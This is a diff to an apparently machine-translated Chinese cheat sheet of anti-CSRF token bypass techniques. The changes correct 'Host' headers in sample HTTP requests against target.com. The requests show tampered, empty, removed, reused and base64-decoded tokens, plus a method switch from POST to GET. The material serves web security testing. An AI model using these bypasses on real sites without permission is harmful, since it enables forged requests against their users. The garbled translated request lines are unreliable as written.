@@ -23,7 +23,7 @@ POST /注册HTTP / 1.1
 试试这个绕过
 ```
 POST /注册HTTP / 1.1
-主持人：target.com
+Host：target.com
 [...]
 
 用户名= dapos＆password = 123456＆token = aaaaaaaaaaaaaaaaaaaaaaab
@@ -32,7 +32,7 @@ POST /注册HTTP / 1.1
 2.发送空值的令牌
 ```
 POST /注册HTTP / 1.1
-主持人：target.com
+Host：target.com
 [...]
 
 用户名= dapos＆password = 123456＆token = aaaaaaaaaaaaaaaaaaaaaaaa
@@ -40,7 +40,7 @@ POST /注册HTTP / 1.1
 试试这个绕过
 ```
 POST /注册HTTP / 1.1
-主持人：target.com
+Host：target.com
 [...]
 
 用户名= dapos＆password = 123456＆token =
@@ -49,7 +49,7 @@ POST /注册HTTP / 1.1
 3.用相同长度的令牌替换
 ```
 POST /注册HTTP / 1.1
-主持人：target.com
+Host：target.com
 [...]
 
 用户名= dapos＆password = 123456＆token = aaaaaa
@@ -57,7 +57,7 @@ POST /注册HTTP / 1.1
 试试这个绕过
 ```
 POST /注册HTTP / 1.1
-主持人：target.com
+Host：target.com
 [...]
 
 用户名= dapos＆password = 123456＆token = aaabaa
@@ -65,7 +65,7 @@ POST /注册HTTP / 1.1
 4.更改POST / GET方法
 ```
 POST /注册HTTP / 1.1
-主持人：target.com
+Host：target.com
 [...]
 
 用户名= dapos＆password = 123456＆token = aaaaaaaaaaaaaaaaaaaaaaaa
@@ -73,14 +73,14 @@ POST /注册HTTP / 1.1
 试试这个绕过
 ```
 GET / register？username = dapos＆password = 123456＆token = aaaaaaaaaaaaaaaaaaaaaaaa HTTP / 1.1
-主持人：target.com
+Host：target.com
 [...]
 ```
 
 5.从请求中删除令牌
 ```
 POST /注册HTTP / 1.1
-主持人：target.com
+Host：target.com
 [...]
 
 用户名= dapos＆password = 123456＆token = aaaaaaaaaaaaaaaaaaaaaaaa
@@ -88,7 +88,7 @@ POST /注册HTTP / 1.1
 试试这个绕过
 ```
 POST /注册HTTP / 1.1
-主持人：target.com
+Host：target.com
 [...]
 
 用户名= dapos＆password = 123456
@@ -97,7 +97,7 @@ POST /注册HTTP / 1.1
 6.使用其他用户的有效令牌
 ```
 POST /注册HTTP / 1.1
-主持人：target.com
+Host：target.com
 [...]
 
 用户名= dapos＆password = 123456＆token = ANOTHER_VALID_TOKEN
@@ -106,7 +106,7 @@ POST /注册HTTP / 1.1
 7.尝试解密哈希
 ```
 POST /注册HTTP / 1.1
-主持人：target.com
+Host：target.com
 [...]
 
 用户名= dapos＆password = 123456＆token = MTIzNDU2
@@ -116,7 +116,7 @@ MTIzNDU2 => 123456使用base64
 8.有时反CSRF令牌由两部分组成，其中一个保持静态，而另一个则动态
 ```
 POST /注册HTTP / 1.1
-主持人：target.com
+Host：target.com
 [...]
 
 用户名= dapos＆password = 123456＆token = vi802jg9f8akd9j123
@@ -124,7 +124,7 @@ POST /注册HTTP / 1.1
 当我们再次注册时，这样的请求
 ```
 POST /注册HTTP / 1.1
-主持人：target.com
+Host：target.com
 [...]
 
 用户名= dapos＆password = 123456＆token = vi802jg9f8akd9j124
